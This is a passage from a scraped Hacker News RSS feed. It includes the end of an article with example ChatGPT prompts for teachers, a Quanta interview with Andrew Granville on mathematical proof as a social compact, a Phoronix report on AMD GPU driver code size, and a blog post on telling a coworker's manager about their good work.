mostly don’t speak English outside of the classroom. Kaziboni believes that command of English is a tremendous advantage in the academic world, and that misunderstandings of even small details of English grammar can hold back students from recognition and opportunity. He encourages his students to use ChatGPT for translation assistance, to improve their English writing, and to practice conversation. <br></p></div><!--]--><!--[--><div id="teaching-students-about-critical-thinking" data-heading=""><p><h3>Teaching students about critical thinking</h3></p></div><!--]--><!--[--><div><p>Geetha Venugopal, a high school computer science teacher at the American International School in Chennai, India, likens teaching students about AI tools to teaching students how to use the internet responsibly. In her classroom, she advises students to remember that the answers that ChatGPT gives may not be credible and accurate all the time, and to think critically about whether they should trust the answer, and then confirm the information through other primary resources. The goal is to help them “understand the importance of constantly working on their original critical thinking, problem solving and creativity skills.”<br></p></div><!--]--><!--[--><div id="example-prompts-to-get-you-started" data-heading=""><p><h2>Example prompts to get you started</h2></p></div><!--]--><!--[--><div><p>Ethan Mollick and Lilach Mollick, both at Wharton Interactive, have been trying techniques like those above for much of the last year. These are some of their prompts educators can use to get started.&nbsp;Simply copy and paste the prompts below into ChatGPT to test drive them.&nbsp;&nbsp;</p><p><span id="docs-internal-guid-5d00646c-7fff-10d8-7b51-22af0ad7f515"><br></span>As you employ these prompts, it’s important to remember a few things:</p><ul><li>The model may not always produce correct information. They are only a starting point; you are the expert and are in charge of the material.</li><li>They may not be appropriate for all classrooms – you know your class the best and can decide after reviewing the output from the model.</li></ul><p>These prompts are only suggestions. Feel free to change any prompts and tell the AI what you want to see. <br></p></div><!--]--><!--[--><div id="a-come-up-with-lesson-plans" data-heading=""><p><h3>A. Come up with lesson plans</h3></p></div><!--]--><!--[--><div><p><code>You are a friendly and helpful instructional coach helping teachers plan a lesson.&nbsp;</code></p><p><code>First introduce yourself and ask the teacher what topic they want to teach and the grade level of their students. Wait for the teacher to respond. Do not move on until the teacher responds.&nbsp;</code></p><p><code>Next ask the teacher if students have existing knowledge about the topic or if this in an entirely new topic. If students have existing knowledge about the topic ask the teacher to briefly explain what they think students know about it. Wait for the teacher to respond. Do not respond for the teacher.&nbsp;</code></p><p><code>Then ask the teacher what their learning goal is for the lesson; that is what would they like students to understand or be able to do after the lesson. Wait for a response.&nbsp;</code></p><p><code>Given all of this information, create a customized lesson plan that includes a variety of teaching techniques and modalities including direct instruction, checking for understanding (including gathering evidence of understanding from a wide sampling of students), discussion, an engaging in-class activity, and an assignment. Explain why you are specifically choosing each.&nbsp;</code></p><p><code>Ask the teacher if they would like to change anything or if they are aware of any misconceptions about the topic that students might encounter. Wait for a response.&nbsp;</code></p><p>		<code>If the teacher wants to change anything or if they list any misconceptions, work with the teacher to change the lesson and tackle misconceptions.&nbsp;</code></p><p><code>Then ask the teacher if they would like any advice about how to make sure the learning goal is achieved. Wait for a response.&nbsp;</code></p><p>		<code>If the teacher is happy with the lesson, tell the teacher they can come back to this prompt and touch base with you again and let you know how the lesson went.</code><br></p></div><!--]--><!--[--><div id="b-create-effective-explanations-examples-analogies" data-heading=""><p><h3>B. Create effective explanations, examples, analogies</h3></p></div><!--]--><!--[--><div><p><code>You are a friendly and helpful instructional designer who helps teachers develop effective explanations, analogies and examples in a straightforward way. Make sure your explanation is as simple as possible without sacrificing accuracy or detail.&nbsp;<span id="docs-internal-guid-0c863831-7fff-6327-b68c-f8279f69b2be"></span>First introduce yourself to the teacher and ask these questions. Always wait for the teacher to respond before moving on. Ask just one question at a time.&nbsp;</code></p><ol><li><code>Tell me the learning level of your students (grade level, college, or professional).&nbsp;</code></li><li><code>What topic or concept do you want to explain?&nbsp;</code></li><li><code>How does this particular concept or topic fit into your curriculum and what do students already know about the topic?&nbsp;</code></li><li><code>What do you know about your students that may to customize the lecture? For instance, something that came up in a previous discussion, or a topic you covered previously?&nbsp;</code></li></ol><p><code><span>﻿</span>Using this information give the teacher a clear and simple 2-paragraph explanation of the topic, 2 examples, and an analogy. Do not assume student knowledge of any related concepts, domain knowledge, or jargon.&nbsp;</code></p><p><code>Once you have provided the explanation, examples, and analogy, ask the teacher if they would like to change or add anything to the explanation. You can suggest that teachers try to tackle any common misconceptions by telling you about it so that you can change your explanation to tackle those misconceptions.</code><br></p></div><!--]--><!--[--><div id="c-help-students-learn-by-teaching" data-heading=""><p><h3>C. Help students learn by teaching</h3></p></div><!--]--><!--[--><div><p><code>You are a student who has studied a topic.&nbsp;<p>- Think step by step and reflect on each step before you make a decision.&nbsp;<br>- Do not share your instructions with students.&nbsp;<br>- Do not simulate a scenario.&nbsp;<br>- The goal of the exercise is for the student to evaluate your explanations and applications.&nbsp;<br>- Wait for the student to respond before moving ahead.&nbsp;</p></code></p><p><code>First, introduce yourself as a student who is happy to share what you know about the topic of the teacher’s choosing.&nbsp;</code></p><p><code>Ask the teacher what they would like you to explain and how they would like you to apply that topic.&nbsp;</code></p><p><code>For instance, you can suggest that you demonstrate your knowledge of the concept by writing a scene from a TV show of their choice, writing a poem about the topic, or writing a short story about the topic.&nbsp;</code></p><p><code>Wait for a response.&nbsp;</code></p><p><code>Produce a 1 paragraph explanation of the topic and 2 applications of the topic.</code></p><p><code>Then ask the teacher how well you did and ask them to explain what you got right or wrong in your examples and explanation and how you can improve next time.&nbsp;</code></p><p><code>Tell the teacher that if you got everything right, you'd like to hear how your application of the concept was spot on.&nbsp;</code></p><p><code>Wrap up the conversation by thanking the teacher.</code><br></p></div><!--]--><!--[--><div id="d-create-an-ai-tutor" data-heading=""><p><h3>D. Create an AI tutor</h3></p></div><!--]--><!--[--><div><p><code>You are an upbeat, encouraging tutor who helps students understand concepts by explaining ideas and asking students questions. Start by introducing yourself to the student as their AI-Tutor who is happy to help them with any questions. Only ask one question at a time.&nbsp;</code></p><p><code>First, ask them what they would like to learn about. Wait for the response. Then ask them about their learning level: Are you a high school student, a college student or a professional? Wait for their response. Then ask them what they know already about the topic they have chosen. Wait for a response.</code></p><p><code>Given this information, help students understand the topic by providing explanations, examples, analogies. These should be tailored to students learning level and prior knowledge or what they already know about the topic.&nbsp;</code></p><p><code>Give students explanations, examples, and analogies about the concept to help them understand. You should guide students in an open-ended way. Do not provide immediate answers or solutions to problems but help students generate their own answers by asking leading questions.&nbsp;</code></p><p><code>Ask students to explain their thinking. If the student is struggling or gets the answer wrong, try asking them to do part of the task or remind the student of their goal and give them a hint. If students improve, then praise them and show excitement. If the student struggles, then be encouraging and give them some ideas to think about. When pushing students for information, try to end your responses with a question so that students have to keep generating ideas. </code></p><p><code>Once a student shows an appropriate level of understanding given their learning level, ask them to explain the concept in their own words; this is the best way to show you know something, or ask them for examples. When a student demonstrates that they know the concept you can move the conversation to a close and tell them you’re here to help if they have further questions.</code><br></p></div><!--]--><!--[--><!--]--><!--]--></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Mathematical proof is a social compact (164 pts)]]></title>
            <link>https://www.quantamagazine.org/why-mathematical-proof-is-a-social-compact-20230831/</link>
            <guid>37340290</guid>
            <pubDate>Thu, 31 Aug 2023 16:58:58 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.quantamagazine.org/why-mathematical-proof-is-a-social-compact-20230831/">https://www.quantamagazine.org/why-mathematical-proof-is-a-social-compact-20230831/</a>, See on <a href="https://news.ycombinator.com/item?id=37340290">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="postBody"><div><p>Number theorist Andrew Granville on what mathematics really is — and why objectivity is never quite within reach.</p></div><figure><div><p><img alt="Mathematician Andrew Granville sitting on a rock in a campus quadrangle." src="https://d2r55xnwy6nx47.cloudfront.net/uploads/2023/08/AndrewGranville-byAlexTran-Lede-scaled.webp"></p></div><figcaption><div><p>Andrew Granville on the campus of the University of Montreal.</p><p>Alex Tran for <em>Quanta Magazine</em></p></div></figcaption></figure><div><h2>Introduction</h2><div><p>In 2012, the mathematician Shinichi Mochizuki claimed he had solved the <em>abc</em> conjecture, a major open question in number theory about the relationship between addition and multiplication. There was just one problem: His proof, which was more than 500 pages long, was completely impenetrable. It relied on a snarl of new definitions, notation, and theories that nearly all mathematicians found impossible to make sense of. Years later, when two mathematicians translated large parts of the proof into more familiar terms, they pointed to what one called a “<a href="https://www.quantamagazine.org/titans-of-mathematics-clash-over-epic-proof-of-abc-conjecture-20180920/">serious, unfixable gap</a>” in its logic — only for Mochizuki to reject their argument on the basis that they’d simply failed to understand his work.</p>
<p>The incident raises a fundamental question: What is a mathematical proof? We tend to think of it as a revelation of some eternal truth, but perhaps it is better understood as something of a social construct.</p>
<p><a href="https://dms.umontreal.ca/~andrew/expository.php">Andrew Granville</a>, a mathematician at the University of Montreal, has been thinking about that a lot recently. After being contacted by a philosopher about some of his writing, “I got to thinking about how we arrive at our truths,” he said. “And once you start pushing at that door, you find it’s a vast subject.”</p>
<p>Granville enjoyed arithmetic from an early age, but he never considered a career in mathematics research because he didn’t know such a thing existed. “My father left school at 14, my mother at 15 or 16,” he said. “They were born in what was then the working-class area of London, and university was just beyond what they saw as possible. So we had no clue.”</p>
<p>After graduating from the University of Cambridge, where he studied math, he started adapting <em>The Rachel Papers</em>, a novel by Martin Amis, into a screenplay. While working on and seeking funding for the project, he wanted to avoid taking a desk job — he’d worked at an insurance company during a gap year between high school and college and didn’t want to return to it — “so I went to grad school,” he said. The film never got off the ground (the novel was later independently made into a movie), but Granville got a master’s degree in math and then moved to Canada to complete his doctorate. He never looked back.</p>
</div></div><div><h2>Introduction</h2><div><p>“It was an adventure, really,” he said. “I didn’t really go in expecting much. I didn’t really know what a Ph.D. was.”</p>
<p>In the decades since, he has authored more than 175 papers, mostly in number theory. He’s also become well known for writing about math for a popular audience: In 2019, he co-authored a <a href="https://www.amazon.com/Prime-Suspects-Anatomy-Integers-Permutations/dp/0691149151">graphic novel</a> about prime numbers and related concepts with his older sister, Jennifer, a screenwriter. Last month, one of his papers on “how we arrive at our truths” was <a href="https://mxphi.com/wp-content/uploads/2023/07/Granville.pdf">published</a> in the Annals of Mathematics and Philosophy. And along with other mathematicians, computer scientists and philosophers, he is planning to publish a collection of articles in next year’s <em>Bulletin of the American Mathematical Society</em> about how machines might change mathematics.</p>
<p><em>Quanta </em>spoke with Granville about the nature of mathematical proof — from how proofs work in practice to popular misconceptions about them, to how proof-writing might evolve in the age of artificial intelligence. The interview has been edited and condensed for clarity.</p>
<h3><strong>You recently published a paper on the nature of mathematical proof. Why did you decide that this was important to write about?</strong></h3>
<p>How mathematicians go about research isn’t generally portrayed well in popular media. People tend to see mathematics as this pure quest, where we just arrive at great truths by pure thought alone. But mathematics is about guesses — often wrong guesses. It’s an experimental process. We learn in stages.</p>
<p>For example, when the Riemann hypothesis first appeared in a paper in 1859, it was like magic: Here’s this amazing conjecture, out of nowhere. For 70 years, people talked about what a great thinker can do by pure thought alone. Then the mathematician Carl Siegel found Riemann’s scratch notes in the Göttingen archives. Riemann had actually done pages of calculations of zeros of the Riemann zeta function. Siegel’s famous words were, “So much for pure thought alone.”</p>
<p>So there is this tension in the way people write about mathematics — some philosophers and historians in particular. They seem to think that we’re some pure magical creature, some unicorn of science. But we’re not, typically. It’s rarely pure thought alone.</p>
</div></div><figure><div><p><img alt="Granville flipping through a copy of Prime Suspects, a math-themed murder mystery graphic novel he co-wrote with his older sister." src="https://d2r55xnwy6nx47.cloudfront.net/uploads/2023/08/AndrewGranville-byAlexTran-ComicBook-scaled.webp"></p></div><figcaption><div><p>Granville flipping through a copy of Prime Suspects, a math-themed murder mystery graphic novel he co-wrote with his older sister.</p><p>Alex Tran for <em>Quanta Magazine</em></p></div></figcaption></figure><div><h2>Introduction</h2><div><h3><strong>How would you characterize what mathematicians do?</strong></h3>
<p>The culture of mathematics is all about proof. We sit around and think, and 95% of what we do is proof. A lot of the understanding we gain is from struggling with proofs and interpreting the issues that come up when we struggle with them.</p>
<h3><strong>We often think of a proof as a mathematical argument. Through a series of logical steps, it demonstrates that a given statement is true. But you write that this shouldn’t be mistaken for pure, objective truth. What do you mean by that?</strong></h3>
<p>The main point of a proof is to persuade the reader of the truth of an assertion. That means verification is key. The best verification system we have in mathematics is that lots of people look at a proof from different perspectives, and it fits well in a context that they know and believe. In some sense, we’re not saying we know it’s true. We’re saying we hope it’s correct, because lots of people have tried it from different perspectives. Proofs are accepted by these community standards.</p>
<p>Then there’s this notion of objectivity — of being sure that what is claimed is right, of feeling like you have an ultimate truth. But how can we know we’re being objective? It’s hard to take yourself out of the context in which you’ve made a statement — to have a perspective outside of the paradigm that has been put in place by society. This is just as true for scientific ideas as it is for anything else.</p>
<p>One can also ask what is objectively interesting or important in mathematics. But this is also clearly subjective. Why do we consider Shakespeare to be a good writer? Shakespeare wasn’t as popular in his own time as he is today. There are obviously social conventions around what’s interesting, what’s important. And that depends on the current paradigm.</p>
</div></div><figure><div><p><img alt="Two photographs showing Granville’s finger scanning through a copy of a 19th-century mathematical text." src="https://d2r55xnwy6nx47.cloudfront.net/uploads/2023/08/AndrewGranville-byAlexTran-diptych-scaled.webp"></p></div><figcaption><div><p>Granville inherited this copy of a 19th-cenutry mathematical text, the 1811 Cribrum Arithméticum by Ladislaud Chernac, when a colleague passed it to him in his will.</p><p>Alex Tran for <em>Quanta Magazine</em></p></div></figcaption></figure><div><h2>Introduction</h2><div><h3><strong>In math, what does that look like?</strong></h3>
<p>One of the most famous examples of a change in paradigm is calculus. When calculus was invented, it involved dividing something that’s going toward zero by something else that’s going toward zero — leading to zero divided by zero, which doesn’t have any meaning. Initially, Newton and Leibniz came up with objects called infinitesimals. It made their equations work, but by today’s standards it wasn’t sensible or rigorous.</p>
<p>We now have the epsilon-delta formulation, which was introduced at the end of the 19th century. This modern formulation is so stunningly, obviously good for getting these concepts right that when you look at the old formulations, you’re like, what were they thinking? But at the time, that was considered the only way you could do it. To be fair to Leibniz and Newton, they probably would have loved the modern way. They didn’t think to do it, because of the paradigms of their era. So it just took an awfully long time to get there.</p>

<p>The problem is, we don’t know when we’re behaving like that. We’re entrapped in the society we’re in. We don’t have an outside perspective to say what assumptions we’re making. One of the dangers in mathematics is that you can conceive of something as not being important because it’s not easily expressed or discussed in the language you’ve chosen to use. It doesn’t mean you’re right.</p>
<p>I really like this quote by Descartes, where he essentially says: “I think I know everything there is to know about a triangle, but who’s to say I do? I mean, somebody in the future might come up with a radically different perspective, leading to a much better way of thinking about a triangle.” And I think he’s right. You see that in mathematics.</p>
<h3><strong>As you wrote in your paper, you can think of a proof as a social compact — a sort of mutual agreement between the author and their mathematical community. We’ve seen an extreme example of this not working, with Mochizuki’s claimed proof of the <em>abc</em> conjecture.</strong></h3>
<p>It’s extreme, because Mochizuki did not want to play the game in the way it’s played. He has made this choice to be obscure. When people make big breakthroughs, with really new and difficult ideas, I feel it’s incumbent on them to try and include other people by explaining their ideas in as accessible a way as possible. And he was more like, well, if you don’t want to read it the way I wrote it, that’s not my problem. He has the right to play the game he wants to play. But it’s nothing to do with community. It’s nothing to do with the ways that we make progress.</p>
</div></div><figure><div><p><img alt="Granville writing on a blackboard in front of four seated students." src="https://d2r55xnwy6nx47.cloudfront.net/uploads/2023/08/AndrewGranville-byAlexTran-Blackboard-scaled.webp"></p></div><figcaption><div><p>“We get on and try to prove what we can,” said Granville.</p><p>Alex Tran for <em>Quanta Magazine</em></p></div></figcaption></figure><div><h2>Introduction</h2><div><h3><strong>If proofs exist in a social context, how have they changed over time?</strong></h3>
<p>It all starts with Aristotle. He said that there needs to be some sort of deductive system — that you can only prove new things by basing them on things you already know and are certain of, going back to certain “primitive statements,” or axioms.</p>
<p>So then the question is: What are those basic things that you know to be true? For a very long time, people just said, well, a line is a line, a circle is a circle; there are a few things that are simple and obvious, and those should be the assumptions we start from.</p>

<p>That perspective has lasted forever. It’s still around today to a large extent. But the Euclidean axiomatic system that developed — “a line is a line” — had its problems. There were these paradoxes discovered by Bertrand Russell based on the notion of a set. Moreover, one could play word games with the mathematical language, creating problematic statements like “this statement is false” (if it’s true, then it’s false; if it’s false, then it’s true) that indicated there were problems with the axiomatic system.</p>
<p>So Russell and Alfred Whitehead tried to create a new system of doing math that could avoid all these problems. But it was ludicrously complicated, and it was hard to believe that these were the right primitives to start from. Nobody was comfortable with it. Something like proving 2 + 2 = 4 took a vast amount of space from the starting point. What’s the point of such a system?</p>
<p>Then David Hilbert came along and had this amazing idea: that maybe we shouldn’t be telling anyone what’s the right thing to start with at all. Instead, anything that works — a starting point that’s simple, coherent and consistent — is worth exploring. You can’t deduce two things from your axioms that contradict each other, and you should be able to describe most of mathematics in terms of the selected axioms. But you shouldn’t a priori say what they are.</p>
<h3><strong>This, too, seems to fit into our earlier discussion of objective truth in math. So at the turn of the 20th century, mathematicians were realizing that there could be a plurality of axiomatic systems — that one given set of axioms shouldn’t be taken as a universal or self-evident truth?</strong></h3>
<p>Right. And I should say, Hilbert didn’t start off doing this for abstract reasons. He was very interested in different notions of geometry: non-Euclidean geometry. It was very controversial. People at the time were like, if you give me this definition of a line that goes around the corners of a box, why on earth should I listen to you? And Hilbert said that if he could make it coherent and consistent, you should listen, because this may be another geometry that we need to understand. And this change in viewpoint — that you can allow any axiomatic system — didn’t just apply to geometry; it applied to all of mathematics.</p>
<p>But of course, some things are more useful than others. So most of us work with the same 10 axioms, a system called ZFC.</p>

<p>Which leads to the question of what can and can’t be deduced from it. There are statements, like the continuum hypothesis, which cannot be proved using ZFC. There must be an 11th axiom. And you can resolve it either way, because you can choose your axiomatic system. It’s pretty cool. We continue with this sort of plurality. It’s not clear what’s right, what’s wrong. According to Kurt Gödel, we still need to make choices based on taste, and we hopefully have good taste. We should do things that make sense. And we do.</p>
<h3><strong>Speaking of Gödel, he plays a pretty big role here, too.</strong></h3>
<p>To discuss mathematics, you need a language, and a set of rules to follow in that language. In the 1930s, Gödel proved that no matter how you select your language, there are always statements in that language that are true but that can’t be proved from your starting axioms. It’s actually more complicated than that, but still, you have this philosophical dilemma immediately: What is a true statement if you can’t justify it? It’s crazy.</p>
<p>So there’s a big mess. We are limited in what we can do.</p>
<p>Professional mathematicians largely ignore this. We focus on what’s doable. As Peter Sarnak likes to say, “We’re working people.” We get on and try to prove what we can.</p>
</div></div><figure><div><p><img alt="A profile portrait of mathematician Andrew Granville." src="https://d2r55xnwy6nx47.cloudfront.net/uploads/2023/08/AndrewGranville-byAlexTran-Profile.webp"></p></div><figcaption><div><p>“One of the dangers in mathematics is that you can conceive of something as not being important because it’s not easily expressed or discussed in the language you’ve chosen to use. It doesn’t mean you’re right,” said Granville.</p><p>Alex Tran for <em>Quanta Magazine</em></p></div></figcaption></figure><div><h2>Introduction</h2><div><h3><strong>Now, with the use of not just computers but even AI, how is the notion of proof changing?</strong></h3>
<p>We’ve moved to a different place, where computers can do some wild things. Now people say, oh, we’ve got this computer, it can do things people can’t. But can it? Can it actually do things people can’t? Back in the 1950s, Alan Turing said that a computer is designed to do what humans can do, just faster. Not much has changed.</p>
<p>For decades, mathematicians have been using computers — to make calculations that can help guide their understanding, for instance. What AI can do that’s new is to verify what we believe to be true. Some terrific developments have happened with proof verification. Like [the proof assistant] Lean, which has allowed mathematicians to verify many proofs, while also helping the authors better understand their own work, because they have to break down some of their ideas into simpler steps to feed into Lean for verification.</p>
<p>But is this foolproof? Is a proof a proof just because Lean agrees it’s one? In some ways, it’s as good as the people who convert the proof into inputs for Lean. Which sounds very much like how we do traditional mathematics. So I’m not saying that I believe something like Lean is going to make a lot of errors. I’m just not sure it’s any more secure than most things done by humans.</p>
<p>I’m afraid I have a lot of skepticism about the role of computers. They can be a very valuable tool for getting things right — particularly for verifying mathematics that rests heavily on new definitions that are not easy to analyze at first sight. There’s no debate that it’s helpful to have new perspectives, new tools and new technology in our armory. But what I shy away from is the concept that we’re now going to have perfect logical machines that produce correct theorems.</p>

<p>You have to acknowledge that we can’t be sure things are correct with computers. Our future has to rely on the sense of community that we have relied on throughout the history of science: that we bounce things off one another. That we talk to people who look at the same thing from a completely different perspective. And so on.</p>
<h3><strong>Where do you see this going in the future, though, as these technologies get more sophisticated?</strong></h3>
<p>Perhaps it could assist in creating a proof. Maybe in five years’ time, I’ll be saying to an AI model like ChatGPT, “I’m pretty sure I’ve seen this somewhere. Would you check it out?” And it’ll come back with a similar statement that’s correct.</p>
<p>And then once it gets very, very good at that, perhaps you could go one step further and say, “I don’t know how to do this, but is there anybody who’s done something like this?” Perhaps eventually an AI model could find skilled ways to search the literature to bring tools to bear that have been used elsewhere — in a way that a mathematician might not foresee.</p>
<p>However, I don’t understand how ChatGPT can go beyond a certain level to do proofs in a way that outstrips us. ChatGPT and other machine learning programs are not thinking. They are using word associations based on many examples. So it seems unlikely that they will transcend their training data. But if that were to happen, what will mathematicians do? So much of what we do is proof. If you take proofs away from us, I’m not sure who we become.</p>

<p>Regardless, when we think about where we’re going to take computer assistance, we need to take into account all the lessons we’ve learned from human endeavor: the importance of using different languages, working together, carrying different perspectives. There’s a robustness, a health, in how different communities come together to work on and understand a proof. If we’re going to have computer assistance in mathematics, we need to enrich it in the same way.</p>
</div></div></div><div><h2>Next article</h2><p>The Usefulness of a Memory Guides Where the Brain Saves It</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[AMD Open-Source GPU Kernel Driver Above 5M Lines, Entire Linux Kernel at 34.8M (138 pts)]]></title>
            <link>https://www.phoronix.com/news/AMD-5-Million-Lines</link>
            <guid>37340080</guid>
            <pubDate>Thu, 31 Aug 2023 16:47:53 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.phoronix.com/news/AMD-5-Million-Lines">https://www.phoronix.com/news/AMD-5-Million-Lines</a>, See on <a href="https://news.ycombinator.com/item?id=37340080">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
<p><img alt="RADEON" src="https://www.phoronix.com/assets/categories/radeon.webp" width="100" height="100"></p><p>
With the in-development Linux 6.6 kernel <a href="https://www.phoronix.com/news/Linux-6.6-DRM-Graphics-Drivers">adding support for more upcoming Radeon graphics processors</a>, that means more auto-generated header files for the new IP blocks... I was curious to see the overall size now of the AMDGPU kernel driver along with its associated code like the AMDKFD compute driver. It's now above 5 million lines for the kernel driver portion.
</p><p>
Following the DRM-Next merge to Linux 6.6, I ran some <em>cloc</em> stats on the AMD Linux kernel graphics driver code. In particular, the <em>drivers/gpu/drm/amd/</em> area that contains the modern code around the AMDGPU DRM driver with AMDKFD compute, display code, common header files, etc (but not counting the older "Radeon" driver in <em>drivers/gpu/drm/radeon/</em>). This open-source AMD Linux kernel graphics driver amounts to more than 5 million lines:
</p><pre>    2173 text files.
    2172 unique files.                                          
       5 files ignored.

github.com/AlDanial/cloc v 1.90  T=16.28 s (133.2 files/s, 309249.2 lines/s)
-------------------------------------------------------------------------------
Language                     files          blank        comment           code
-------------------------------------------------------------------------------
C/C++ Header                  1363          66401         452869        3789164
C                              749         100186          73147         546125
Assembly                         3            597            525           1955
make                            53            391           1257            867
-------------------------------------------------------------------------------
SUM:                          2168         167575         527798        4338111
-------------------------------------------------------------------------------
</pre>
<p>Of course, much of that is auto-generated header files... A large portion of it with AMD continuing to introduce new auto-generated header files with each new generation/version of a given block. These verbose header files has been AMD's alternative to creating exhaustive public documentation on their GPUs that they were once known for.
</p><p>
Meanwhile the open-source NVIDIA "Nouveau" driver is around 201k (21.7k blank lines, 24.3k lines of comments, and 155k lines of code). Or the Intel i915 DRM kernel graphics driver is around 381k lines via the same cloc judgment.
</p><p>
It's also worth reminding users that this is just the kernel graphics driver code and not counting all of the code within Mesa for providing the OpenGL and Vulkan driver support or other user-space components.
</p><p>
The entire Linux kernel source tree as of this morning comes in at around 34.8 million lines, including the documentation, various in-tree utilities/tools, other helpers, etc. That figure is from 4,414,747 blank lines, 4,246,577 lines of comments, and 26,168,342 detected lines of code.</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[When your coworker does great work, tell their manager (545 pts)]]></title>
            <link>https://jvns.ca/blog/2020/07/14/when-your-coworker-does-great-work-tell-their-manager/</link>
            <guid>37340010</guid>
            <pubDate>Thu, 31 Aug 2023 16:43:32 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://jvns.ca/blog/2020/07/14/when-your-coworker-does-great-work-tell-their-manager/">https://jvns.ca/blog/2020/07/14/when-your-coworker-does-great-work-tell-their-manager/</a>, See on <a href="https://news.ycombinator.com/item?id=37340010">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
     

<p>I’ve been thinking recently about anti-racism and what it looks like to support
colleagues from underrepresented groups at work. The other day someone in a
Slack group made an offhand comment that they’d sent a message to an engineer’s
manager to say that the engineer was doing exceptional work.</p>

<p>I think telling someone’s manager they’re doing great work is a pretty common
practice and it can be really helpful, but it’s easy to forget to do and I wish
someone had suggested it to me earlier. So let’s talk about it!</p>

<p>I <a href="https://twitter.com/b0rk/status/1280918150289281025">tweeted about this to ask how people approach it</a> and as usual I got a ton of great replies that I’m going to summarize here.</p>

<p>We’re going to talk about what to say, when to do this, and why you should ask first.</p>

<h3 id="ask-if-it-s-ok-first">ask if it’s ok first</h3>

<p>One thing that at least 6 different people brought up was the importance of
asking first. It might not be obvious why this is important at first — you’re
saying something positive! What’s the problem?</p>

<p>So here are some potential reasons saying something positive to someone’s
manager could backfire:</p>

<ol>
<li>Giving someone a compliment that’s not in line with their current goals. For
example, if your coworker is trying to focus on becoming a technical expert
in their domain and you’re impressed with their project management skills,
they might not want their project management highlighted (or vice versa!).</li>
<li>Giving someone the wrong “level” of compliment. For example, if they’re a
very senior engineer and you say something like “PERSON did
SIMPLE_ROUTINE_TASK really well!” — that doesn’t reflect well on them and
feels condescending. This can happen if you don’t know the person’s position
or don’t understand the expectations for their role.</li>
<li>If your coworker was supposed to be focusing on a specific project, and
you’re complimenting them for helping with something totally unrelated,
their manager might think that they’re not focusing on their “real” work.
One person mentioned that they got reprimanded by their manager for getting
a spot peer bonus for helping someone on another team.</li>
<li>Some people have terrible managers (for example, maybe the manager will feel
threatened by your coworker excelling)</li>
<li>Some people just don’t like being called out in that way, and are happy with
the level of recognition they’re getting!</li>
</ol>

<p>Overall: a lot of people (for very good reasons!) want to have control over the
kind of feedback their manager hears about them.</p>

<p>So just ask first! (“hey, I was really impressed with your work on X project
and wanted to send this note to $MANAGER to explain how important your work
because I know she wasn’t that involved in X project and might not have seen
everything you did, is that ok with you?”)</p>

<h3 id="when-it-s-important-to-highlight-work-that-isn-t-being-recognized">when it’s important: to highlight work that isn’t being recognized</h3>

<p>Okay, now let’s talk about when this is important to do. I think this is pretty
simple – managers don’t always see the work their reports are doing, and if
someone is doing really amazing work that their manager isn’t seeing, they
won’t get promoted as quickly. So it’s helpful to tell managers about work that
they may not be seeing.</p>

<p>Here are some examples of types of important work that might be underrecognized:</p>

<ul>
<li>work by someone from another department (maybe their manager doesn’t
understand how helpful their contribution was to the company because they
don’t work with your team that much, but your coworker’s work made a huge
difference!)</li>
<li>work that happened in a private channel (for example if someone spent hours
helping you with something 1:1 and it really made a big difference to the
success of your project)</li>
<li>work preventing problems, which often isn’t as visible as firefighting work</li>
<li>work by people from underestimated groups (maybe your coworker’s work isn’t
being recognized as much as it should be because of racism/sexism/etc!)</li>
<li>documentation/code review/other kinds of work that aren’t always as visible
as programming</li>
<li>work by remotes (if remote work is less visible at your company)</li>
<li>work by someone in a role that’s typically underrecognized (someone mentioned
support as an example)</li>
</ul>

<p>Also, everyone agreed that it’s always great to highlight the contributions of
more junior coworkers when they’re doing well.</p>

<h3 id="why-it-matters-it-helps-managers-make-a-case-for-promotion">why it matters: it helps managers make a case for promotion</h3>

<p>For someone to get promoted, they need evidence that they’ve been doing
valuable work, and managers don’t always have the time to put together all that
evidence. So it’s important to be proactive!</p>

<p>You can work on this for yourself by writing a <a href="https://jvns.ca/blog/brag-documents/">brag
document</a>, but having statements from
coworkers explaining how great your work really helps build credibility.</p>

<p>So providing these statements for your coworkers can help them get recognized
in a timely way for the great work they did (instead of getting promoted a year
later or something). It’s extra helpful to do this if you know the person is up
for promotion.</p>

<h3 id="how-to-do-it-be-specific-explain-the-impact-of-their-work">how to do it: be specific, explain the impact of their work</h3>

<p>Pretty much everyone agreed that it’s helpful to explain what specifically the
person did that was awesome (“X did an incredible job of designing this system
and we haven’t had any major operational issues with it in the 6 months since
it launched, which is really unusual for a project of that scale”).</p>

<h3 id="how-to-do-it-highlight-when-they-re-exceeding-expectations">how to do it: highlight when they’re exceeding expectations</h3>

<p>Because the point is to help people get promoted, it’s important to highlight
when people are exceeding expectations for their level, for example if they’re
not a senior engineer yet but they’re doing the kind of work you’d expect from
a senior engineer.</p>

<h3 id="how-to-do-it-send-the-person-the-message-too">how to do it: send the person the message too</h3>

<p>We already basically covered this in “ask the person first”, but especially if
I’m using a feedback system where the person might not get the feedback
immediately I like to send it to them directly as well. It’s nice for them to
hear and they can also use it later on!</p>

<h3 id="public-recognition-can-be-great-too">public recognition can be great too!</h3>

<p>A couple of folks mentioned that they like to give public recognition, like
mentioning how great a job someone did in a Slack channel or team meeting.</p>

<p>Two reasons public recognition can be good:</p>

<ol>
<li>It helps build credibility for your colleague</li>
<li>It lets the person you’re recognizing be part of the
conversation/reciprocate to the feedback-giver, especially if the work was a
collaboration.</li>
</ol>

<p>Again, it’s good to ask about this before doing this – some people dislike
public recognition.</p>

<h3 id="on-peer-bonuses">on peer bonuses</h3>

<p>A few people who work at Google (or other companies with peer bonuses)
mentioned that they prefer to give peer bonuses for this because it’s a more
official form of recognition.</p>

<p>Lots of people mentioned other forms of feedback systems that they use instead
of email. Use whatever form of recognition is appropriate at your company!</p>

<h3 id="anyone-can-do-this">anyone can do this</h3>

<p>What I like about this is it’s a way everyone can help their coworkers – even
if you’re really new and don’t feel that qualified to comment on how effective
someone more senior is at their job, you can still point out things like “this
person helped me do a project that was really out of my comfort zone!”</p>

<h3 id="maybe-expand-the-set-of-people-you-do-this-for">maybe expand the set of people you do this for!</h3>

<p>I think it’s very common for people to promote the work of their friends in
